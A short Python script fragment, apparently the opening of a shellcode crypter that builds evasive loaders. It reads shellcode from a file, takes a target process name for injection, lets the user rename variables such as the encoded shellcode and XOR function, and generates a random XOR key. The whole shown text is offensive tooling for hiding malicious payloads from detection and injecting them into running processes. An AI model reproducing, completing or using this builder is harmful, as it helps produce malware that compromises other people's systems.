import sys
import os
import random

from Templates.Documentation import print_usage
from Constants.Options import file_options
from Constants.Paths import folder_path

# read the shellcode from the file and then encrypt it
# Also output folder will be specified & the name of the process which will be injected

try:
    plaintext = open(sys.argv[1], "rb").read()
    output_folder = sys.argv[2]
    process_to_inject=sys.argv[3]
    file_alias = sys.argv[4]
    if file_alias not in file_options:
        print(f"Invalid file option. Available options: {', '.join(file_options.keys())}\n")
        sys.exit(1)
    file_option = file_options[file_alias]
    shellcode_var = sys.argv[5] if len(sys.argv) > 5 else "encoded_kwdikas"
    xor_func = sys.argv[6] if len(sys.argv) > 6 else "do_xor"
    key_var = sys.argv[7] if len(sys.argv) > 7 else "key"
    time = sys.argv[8] if len(sys.argv) > 8 else "4000"
except:
    print_usage()
    sys.exit()

#
with open(os.path.join(folder_path, file_option), "r") as f:
    # Read the contents of the file
    file_contents = f.read()

    key = ''.join([chr(random.randint(0, 255)) for i in range(4)])
    key_hex = ''.join(['\\x' + hex(ord(x))[2:].zfill(2) for x in key])
